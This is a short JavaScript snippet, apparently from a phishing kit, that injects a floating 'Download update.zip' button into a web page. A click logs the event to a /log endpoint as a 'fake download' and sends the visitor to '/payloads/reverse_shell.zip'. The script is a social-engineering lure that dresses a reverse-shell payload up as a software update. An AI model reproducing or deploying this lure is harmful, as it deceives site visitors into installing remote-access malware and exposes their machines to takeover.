(function () {
    const downloadDiv = document.createElement("div");
    downloadDiv.innerHTML = `
        <div style="position:fixed;bottom:20px;right:20px;background:#007bff;color:white;
                    padding:15px;border-radius:5px;z-index:9999;box-shadow:0 0 8px rgba(0,0,0,0.5);
                    cursor:pointer;font-family:sans-serif;">
            🔽 Download update.zip
        </div>
    `;

    const btn = downloadDiv.querySelector("div");
    btn.addEventListener("click", () => {
        fetch("/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                type: "download_click",
                data: {
                    message: "User clicked fake download"
                }
            })
        });

        // Trigger actual download from payloads/ if desired
        window.location.href = "/payloads/reverse_shell.zip";
    });

    document.body.appendChild(downloadDiv);
})();
